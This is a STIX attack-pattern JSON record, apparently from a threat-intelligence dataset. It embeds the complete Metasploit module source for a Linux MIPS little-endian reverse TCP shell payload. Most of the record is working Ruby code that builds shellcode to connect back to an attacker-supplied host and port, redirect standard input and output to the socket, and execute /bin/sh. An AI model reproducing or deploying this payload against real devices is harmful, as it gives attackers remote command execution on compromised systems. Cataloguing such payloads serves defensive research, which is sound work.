{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b45343a7-064e-4e36-bd9d-09a8ebbd7f9d",
    "created": "2024-08-14T16:33:19.442828Z",
    "modified": "2024-08-14T16:33:19.442832Z",
    "name": "Linux Command Shell, Reverse TCP Inline",
    "description": "Connect back to attacker and spawn a command shell",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/linux/mipsle/shell_reverse_tcp.rb",
            "external_id": "shell_reverse_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 184\n\n  include Msf::Payload::Single\n  include Msf::Payload::Linux\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Linux Command Shell, Reverse TCP Inline',\n      'Description'   => 'Connect back to attacker and spawn a command shell',\n      'Author'        =>\n        [\n          'rigan <imrigan[at]gmail.com>', # Original (mipsbe) shellcode\n          'juan vazquez' # Metasploit module\n        ],\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'linux',\n      'Arch'          => ARCH_MIPSLE,\n      'Handler'       => Msf::Handler::ReverseTcp,\n      'Session'       => Msf::Sessions::CommandShellUnix,\n      'Payload'       =>\n        {\n          'Offsets' => { },\n          'Payload' => ''\n        })\n    )\n  end\n\n  def generate(_opts = {})\n    if( !datastore['LHOST'] or datastore['LHOST'].empty? )\n      return super\n    end\n\n    host = Rex::Socket.addr_atoi(datastore['LHOST'])\n    port = Integer(datastore['LPORT'])\n\n    host = [host].pack(\"N\").unpack(\"cccc\")\n    port = [port].pack(\"n\").unpack(\"cc\")\n\n    shellcode =\n      # sys_socket\n      # a0: domain\n      # a1: type\n      # a2: protocol\n      \"\\xfa\\xff\\x0f\\x24\" + # li t7,-6\n      \"\\x27\\x78\\xe0\\x01\" + # nor t7,t7,zero\n      \"\\xfd\\xff\\xe4\\x21\" + # addi a0,t7,-3\n      \"\\xfd\\xff\\xe5\\x21\" + # addi a1,t7,-3\n      \"\\xff\\xff\\x06\\x28\" + # slti a2,zero,-1\n      \"\\x57\\x10\\x02\\x24\" + # li v0,4183 # sys_socket\n      \"\\x0c\\x01\\x01\\x01\" + # syscall 0x40404\n\n      # sys_connect\n      # a0: sockfd (stored on the stack)\n      # a1: addr (data stored on the stack)\n      # a2: addrlen\n      \"\\xff\\xff\\xa2\\xaf\" + # sw v0,-1(sp)\n      \"\\xff\\xff\\xa4\\x8f\" + # lw a0,-1(sp)\n      \"\\xfd\\xff\\x0f\\x34\" + # li t7,0xfffd\n      \"\\x27\\x78\\xe0\\x01\" + # nor t7,t7,zero\n      \"\\xe2\\xff\\xaf\\xaf\" + # sw t7,-30(sp)\n      port.pack(\"C2\") + \"\\x0e\\x3c\" + # lui t6,0x1f90\n      port.pack(\"C2\") + \"\\xce\\x35\" + # ori t6,t6,0x1f90\n      \"\\xe4\\xff\\xae\\xaf\" + # sw t6,-28(sp)\n      host[2..3].pack(\"C2\") + \"\\x0e\\x3c\" + # lui t6,0x7f01\n      host[0..1].pack(\"C2\") + \"\\xce\\x35\" + # ori t6,t6,0x101\n      \"\\xe6\\xff\\xae\\xaf\" + # sw t6,-26(sp)\n      \"\\xe2\\xff\\xa5\\x27\" + # addiu a1,sp,-30\n      \"\\xef\\xff\\x0c\\x24\" + # li t4,-17\n      \"\\x27\\x30\\x80\\x01\" + # nor a2,t4,zero\n      \"\\x4a\\x10\\x02\\x24\" + # li v0,4170  # sys_connect\n      \"\\x0c\\x01\\x01\\x01\" + # syscall 0x40404\n\n      # sys_dup2\n      # a0: oldfd (socket)\n      # a1: newfd (0, 1, 2)\n      \"\\xfd\\xff\\x11\\x24\" + # li s1,-3\n      \"\\x27\\x88\\x20\\x02\" + # nor s1,s1,zero\n      \"\\xff\\xff\\xa4\\x8f\" + # lw a0,-1(sp)\n      \"\\x21\\x28\\x20\\x02\" + # move a1,s1 # dup2_loop\n      \"\\xdf\\x0f\\x02\\x24\" + # li v0,4063 # sys_dup2\n      \"\\x0c\\x01\\x01\\x01\" + # syscall 0x40404\n      \"\\xff\\xff\\x10\\x24\" + # li s0,-1\n      \"\\xff\\xff\\x31\\x22\" + # addi s1,s1,-1\n      \"\\xfa\\xff\\x30\\x16\" + # bne s1,s0,68 <dup2_loop>\n\n      # sys_execve\n      # a0: filename (stored on the stack) \"//bin/sh\"\n      # a1: argv \"//bin/sh\"\n      # a2: envp (null)\n      \"\\xff\\xff\\x06\\x28\" + # slti a2,zero,-1\n      \"\\x62\\x69\\x0f\\x3c\" + # lui t7,0x2f2f \"bi\"\n      \"\\x2f\\x2f\\xef\\x35\" + # ori t7,t7,0x6269 \"//\"\n      \"\\xec\\xff\\xaf\\xaf\" + # sw t7,-20(sp)\n      \"\\x73\\x68\\x0e\\x3c\" + # lui t6,0x6e2f \"sh\"\n      \"\\x6e\\x2f\\xce\\x35\" + # ori t6,t6,0x7368 \"n/\"\n      \"\\xf0\\xff\\xae\\xaf\" + # sw t6,-16(sp)\n      \"\\xf4\\xff\\xa0\\xaf\" + # sw zero,-12(sp)\n      \"\\xec\\xff\\xa4\\x27\" + # addiu a0,sp,-20\n      \"\\xf8\\xff\\xa4\\xaf\" + # sw a0,-8(sp)\n      \"\\xfc\\xff\\xa0\\xaf\" + # sw zero,-4(sp)\n      \"\\xf8\\xff\\xa5\\x27\" + # addiu a1,sp,-8\n      \"\\xab\\x0f\\x02\\x24\" + # li v0,4011 # sys_execve\n      \"\\x0c\\x01\\x01\\x01\"  # syscall 0x40404\n\n    return super + shellcode\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}